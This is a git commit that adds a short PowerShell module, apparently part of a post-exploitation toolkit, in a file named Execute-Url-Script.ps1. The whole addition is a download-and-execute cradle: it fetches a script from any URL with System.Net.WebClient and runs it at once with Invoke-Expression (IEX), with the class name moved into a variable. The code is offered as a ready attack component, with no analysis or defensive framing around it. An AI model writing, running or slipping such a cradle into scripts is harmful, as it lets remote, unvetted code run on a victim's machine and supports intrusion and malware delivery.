bdd60ec13bce7d1f714c14e34c2531e71d7a2ec6
cybervaca <cybervaca@gmail.com>
2017-04-07 13:37:04 +0200

    Execute scripts from URL

---
+++ data/module_source/code_execution/Execute-Url-Script.ps1
@@ -0,0 +1,11 @@
+function  execute-url-script {
+param ($url)
+
+$objeto = "system.net.webclient" 
+$webclient = New-Object $objeto 
+$webrequest = $webclient.DownloadString($url)
+IEX $webrequest
+
+
+
+}
